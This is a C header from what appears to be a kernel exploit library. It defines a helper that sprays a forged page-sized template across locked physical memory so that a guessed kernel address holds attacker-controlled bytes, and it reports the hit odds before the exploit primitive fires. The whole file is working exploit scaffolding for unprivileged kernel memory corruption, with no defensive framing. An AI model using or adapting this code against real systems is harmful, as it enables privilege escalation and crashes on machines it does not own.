/* lib/spray/forge_place.h -- placing a self-referential forge on a guessed
 * physical page.
 *
 * A chain that must land a controlled object at a known kernel address without
 * privilege builds a page-sized template that refers only to the one address it
 * guesses, then replicates that template across a large locked spray: whichever
 * sprayed frame the guess actually names already holds the right bytes. This
 * bundles the two steps that always travel together -- the spray, and the
 * a-priori verdict on whether the guess is worth firing -- so every consumer
 * reports the odds the same way and none reimplements the pair.
 *
 * The verdict is printed before the consuming primitive runs, because the cost
 * of a miss is a corrupted foreign page (a later, displaced panic), not a clean
 * error return: a caller that sees a low coverage can widen the spray or skip
 * the shot instead of learning the odds from the reboot count.
 */
#ifndef LIB_FORGE_PLACE_H
#define LIB_FORGE_PLACE_H

#include <stddef.h>
#include "physspray.h"
#include "../addr/zoneguess.h"

/* Replicate `tmpl` across a physmap spray of `spray_bytes`, then print the
 * a-priori hit-odds verdict for `page_va` under `tag`. Returns the spray (a
 * userspace alias of every forged frame, for the caller to retarget or free) or
 * NULL if the mapping failed; *len_out, when given, receives the spray length. */
static inline unsigned char *lib_forge_guess_spray(
		size_t spray_bytes, const void *tmpl, size_t tmpl_len,
		unsigned long long page_va, const char *tag, size_t *len_out)
{
	unsigned char *spray = lib_physspray(spray_bytes, tmpl, tmpl_len);
	if (!spray)
		return NULL;
	if (len_out)
		*len_out = spray_bytes;
	lib_zone_guess_report(tag, page_va, (unsigned long long)spray_bytes);
	return spray;
}

#endif
